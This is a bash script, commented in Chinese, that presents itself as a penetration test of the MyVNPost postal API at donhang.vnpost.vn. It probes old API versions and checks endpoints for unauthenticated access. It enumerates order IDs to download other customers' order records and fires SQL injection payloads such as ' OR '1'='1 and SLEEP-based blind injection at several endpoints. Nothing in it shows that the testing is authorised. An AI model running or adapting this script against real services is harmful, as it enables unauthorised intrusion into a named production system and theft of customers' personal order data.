#!/bin/bash
# MyVNPost API完整测试脚本
# 生成时间: 2025-11-14

TARGET="donhang.vnpost.vn"
WORK_DIR="/workspace/myvnpost_test"
mkdir -p $WORK_DIR && cd $WORK_DIR

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 MyVNPost API渗透测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ============ 阶段1: 历史版本探测 ============
echo ""
echo "[*] 阶段1: 探测11个历史API版本..."

for version in {28..38}; do
    url="https://$TARGET/apimobilev${version}/api/MobileAuthentication/GetAccessToken"
    status=$(curl -sk -o /dev/null -w "%{http_code}" "$url" -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"test","password":"test"}')
    
    if [ "$status" != "404" ]; then
        echo "[✅] v${version} - 存活 (HTTP $status)"
        echo "v${version}|$status" >> alive_versions.txt
    else
        echo "[❌] v${version} - 已下线"
    fi
done

echo ""
echo "[*] 存活版本: $(cat alive_versions.txt 2>/dev/null | wc -l)"

# ============ 阶段2: 未授权访问测试 ============
echo ""
echo "[*] 阶段2: 测试未授权访问..."

# 无需认证的端点测试
UNAUTH_ENDPOINTS=(
    "/api/MobileAuthentication/GetCategoryDataV2"
    "/api/SettingConfig/GetAppSetting"
    "/api/SettingConfig/GetDataVersion"
    "/api/BuuCuc/GetAllForDieuTinAutocomplete"
    "/api/TinhCuoc/TinhTatCaDichVu"
    "/api/TinhCuoc/TinhTatCaCuoc"
)

for endpoint in "${UNAUTH_ENDPOINTS[@]}"; do
    url="https://$TARGET/apimobilev34$endpoint"
    echo "[*] 测试: $endpoint"
    
    response=$(curl -sk "$url" -X GET -o "response_$(echo $endpoint | md5sum | cut -d' ' -f1).json" -w "%{http_code}")
    
    if [ "$response" == "200" ]; then
        echo "  [✅] 无需认证可访问"
    else
        echo "  [❌] HTTP $response"
    fi
done

# ============ 阶段3: IDOR测试 ============
echo ""
echo "[*] 阶段3: IDOR漏洞测试..."

# 订单ID枚举（常见格式）
echo "[*] 测试订单ID枚举..."
for id in {100000..100010}; do
    curl -sk "https://$TARGET/apimobilev34/api/Order/GetOrder/$id" \
        -o "order_${id}.json" 2>/dev/null
    
    if grep -q "itemCode\|orderId" "order_${id}.json" 2>/dev/null; then
        echo "  [✅] 订单 $id 可访问（可能IDOR）"
        cat "order_${id}.json" >> idor_orders.txt
    fi
done

# ============ 阶段4: SQL注入测试 ============
echo ""
echo "[*] 阶段4: SQL注入测试..."

SQLI_ENDPOINTS=(
    "/api/CustomerOrder/GetListOrderForManagerWithCustomerCode"
    "/api/MapVnpost/SearchDiaChi"
    "/api/BuuCuc/GetAllForDieuTinAutocomplete"
)

SQLI_PAYLOADS=(
    "'"
    "' OR '1'='1"
    "1' AND SLEEP(5)--"
    "' UNION SELECT NULL--"
)

for endpoint in "${SQLI_ENDPOINTS[@]}"; do
    echo "[*] 测试: $endpoint"
    
    for payload in "${SQLI_PAYLOADS[@]}"; do
        url="https://$TARGET/apimobilev34${endpoint}?query=${payload}"
        
        start=$(date +%s)
        response=$(curl -sk "$url" -o /dev/null -w "%{http_code}")
        end=$(date +%s)
        time_diff=$((end - start))
        
        if [ $time_diff -gt 4 ]; then
            echo "  [⚠️] 可能存在时间盲注（延时${time_diff}秒）: $payload"
        elif [ "$response" == "500" ]; then
            echo "  [⚠️] SQL错误（HTTP 500）: $payload"
        fi
    done
done

# ============ 阶段5: 敏感信息泄露 ============
echo ""
echo "[*] 阶段5: 敏感信息泄露测试..."

# 测试错误信息泄露
curl -sk "https://$TARGET/apimobilev34/api/Order/GetOrder/99999999" | \
    grep -iE "exception|error|stack|sql|database" > error_leak.txt

if [ -s error_leak.txt ]; then
    echo "[⚠️] 发现错误信息泄露"
    cat error_leak.txt
fi

# ============ 结果汇总 ============
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 测试结果汇总"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "存活历史版本: $(cat alive_versions.txt 2>/dev/null | wc -l)"
echo "未授权端点: $(ls response_*.json 2>/dev/null | wc -l)"
echo "IDOR可能: $(grep -c "itemCode" idor_orders.txt 2>/dev/null)"
echo "SQL注入可能: $(grep -c "⚠️" *.txt 2>/dev/null)"
echo ""
echo "📁 结果文件:"
echo "  - alive_versions.txt (存活版本)"
echo "  - response_*.json (API响应)"
echo "  - idor_orders.txt (IDOR发现)"
echo "  - error_leak.txt (错误泄露)"
echo ""
echo "✅ 测试完成！"
